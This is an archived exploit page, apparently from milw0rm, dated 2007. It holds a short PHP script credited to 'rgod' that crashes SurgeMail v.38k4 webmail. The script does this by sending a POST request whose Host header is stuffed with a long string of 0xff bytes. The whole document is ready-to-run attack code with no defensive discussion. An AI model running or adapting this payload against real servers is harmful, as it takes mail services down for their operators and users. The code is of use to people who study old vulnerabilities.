<html><head><title>SurgeMail v.38k4 webmail Host header Denial of Service Exploit</title></head><pre>&lt;?php
/*
  SurgeMail v.38k4 webmail Host header denial of service exploit
  tested against the windows version

  rgod
*/

dl(&quot;php_curl.so&quot;);
$url = &quot;http://192.168.0.1&quot;;
$puf=str_repeat(0xff,0xfff);

        $header =&quot;POST / HTTP/1.0\r\n&quot;;
        $header.=&quot;Host: $puf\r\n&quot;;
        $header.=&quot;Connection: Close\r\n\r\n&quot;;
      
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,$url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 0);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $header);

        $data = curl_exec($ch); if (curl_errno($ch)) {
           print curl_error($ch).&quot;\n&quot;;
        } else {
           curl_close($ch);
        }

?&gt;

# milw0rm.com [2007-12-18]</pre></html>